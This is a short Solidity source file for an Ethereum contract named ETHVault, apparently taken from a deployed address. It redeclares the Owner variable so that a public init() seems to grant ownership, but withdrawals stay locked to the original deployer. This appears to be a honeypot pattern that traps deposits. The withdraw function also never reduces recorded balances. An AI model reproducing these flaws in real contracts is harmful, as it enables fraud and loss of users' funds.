/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ETHVault at 0xf1aAB4171Ceb49B6a276975347e3c1D4D5650e5A
*/
pragma solidity ^0.4.10;

contract Owned {
    address public Owner;
    function Owned() { Owner = msg.sender; }
    modifier onlyOwner { require( msg.sender == Owner ); _; }
}

contract ETHVault is Owned {
    address public Owner;
    mapping (address=>uint) public deposits;
    
    function init() { Owner = msg.sender; }
    
    function() payable { deposit(); }
    
    function deposit() payable {
        if( msg.value >= 0.25 ether )
            deposits[msg.sender] += msg.value;
        else throw;
    }
    
    function withdraw(uint amount) onlyOwner {
        uint depo = deposits[msg.sender];
        if( amount <= depo && depo > 0 )
            msg.sender.send(amount);
    }

    function kill() onlyOwner {
        require(this.balance == 0);
        suicide(msg.sender);
	}
}